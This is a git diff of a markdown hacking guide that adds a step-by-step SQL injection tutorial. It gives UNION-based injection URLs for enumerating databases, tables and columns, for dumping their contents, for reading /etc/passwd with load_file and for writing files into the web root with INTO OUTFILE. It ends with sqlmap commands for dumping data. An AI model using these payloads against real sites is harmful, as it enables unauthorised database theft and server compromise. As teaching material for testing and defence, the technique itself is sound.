@@ -530,6 +530,8 @@ this on you server, copy the link to the file and paste in the string like so `h
 
 SQL is the programming language for relational databases. A database is where data is stored, like username, emails and passwords.
 
+**SQL Select Pattern**: `SELECT [columns] FROM [database].[table]`
+
 #### Discovering SQL Injections (POST Method)
 
 The most common places to find SQL vulnerabilities are input fields because the input passed there is execute on the server.
@@ -539,6 +541,8 @@ In a login form, for example, if there is a vulnerability in the code, you can l
 This a what a query looks like to login to retrieve information about the user that wants to login.
 
 `SELECT * FROM accounts WHERE username='$username_input' AND password='$passwd_input'`
+
+`*` means all columns.
 
 To check if the website has this vulnerability try to put a single quote (`'`) in the inputs, 
 if you get an error this website is vulnerable.
@@ -570,9 +574,79 @@ It is important to note that when the code is been injected into the browser it 
 
 `%23 = (#)`
 
-You can inject the `ORDER BY [clause]` SQL command as well to order the table by column-number or column-name (clause), 
-this way you will know how much columns that table has. Inject it like so:
+You can inject the `ORDER BY [clause]` SQL command as well to order the table by column-number or column-name (clause),
+this way you will know how many columns that table has. Inject it like so:
 
-`https://page.com/login.php?username=hello'ORDER BY 1%23&password=world`
+`https://page.com/login.php?username=hello' ORDER BY 1 %23&password=world`
 
 Go and sort the numbers till you get the highest number possible without an error. This number will be the number of columns in the table.
+
+#### Read Database Information
+
+After identifying how many columns the table has, the next step is to build a query to get information about the database.
+
+To be able to combine the result of `SELECT` statements use the operator `UNION`.
+
+At the example above, let's suppose that the number of columns is 5. So to get the columns with `UNION` put this in the URL:
+
+`https://page.com/login.php?username=hello' UNION SELECT 1,2,3,4,5 %23&password=world`
+
+Then try some MySQL functions in the column numbers:
+
+`https://page.com/login.php?username=hello' UNION SELECT 1,database(),user(),version(),5 %23&password=world`
+
+These function will retrieve the current database, user and version of the database.
+
+#### Find Database Tables
+
+When the `UNION` operator is been used all columns have to be filled up in the `SELECT` statement,
+so to retrieve information set the other to `null`.
+
+The `information_schema` database is a default database created by MySQL and it contains information about all other databases.
+
+`https://page.com/login.php?username=hello' UNION SELECT null,table_name,null,null,null from information_schema.tables %23&password=world`
+
+This will select the column `table_name` from the table `tables` of the database `information_schema`.
+
+To get all the table names from a database perform:
+
+`https://page.com/login.php?username=hello' UNION SELECT null,table_name,null,null,null from information_schema.tables where table_schema='[database name]' %23&password=world`
+
+To get the columns a table from a database perform:
+
+`https://page.com/login.php?username=hello' UNION SELECT null,column_name,null,null,null from information_schema.columns where table_name='[table name]' %23&password=world`
+
+To get content in the columns from a table from a database perform:
+
+`https://page.com/login.php?username=hello' UNION SELECT null,[column name],null,null,null from [table name] %23&password=world`
+
+#### Read and Write Files On The Server
+
+With these functions the database can read and write files on the server. To see the perform:
+
+`https://page.com/login.php?username=hello' UNION SELECT null,load_file('/etc/passwd'),null,null,null %23&password=world`
+
+`https://page.com/login.php?username=hello' UNION SELECT null,'anything to be written in the server',null,null,null into outfile '/var/www/html/file.txt' %23&password=world`
+
+If you don't have permissions to write a file in that directory just write in another one.
+
+#### Extract Data With SQLmap
+
+SQLmap is a tool that automates the search for vulnerabilities on the target server.
+
+Type `sqlmap --help` to see options and use these options to attack the server.
+
+* Run SQLmap
+  * `sqlmap -u "[target url]"`
+* Get current databases
+  * `sqlmap -u "[target url]" --dbs`
+* Get current user
+  * `sqlmap -u "[target url]" --current-user`
+* Get current database
+  * `sqlmap -u "[target url]" --current-database`
+* Get tables
+  * `sqlmap -u "[target url]" --tables -D [database name]`
+* Get columns
+  * `sqlmap -u "[target url]" --columns -T [table name] -D [database name]`
+* Get data of the columns
+  * `sqlmap -u "[target url]" --dump -T [table name] -D [database name]`
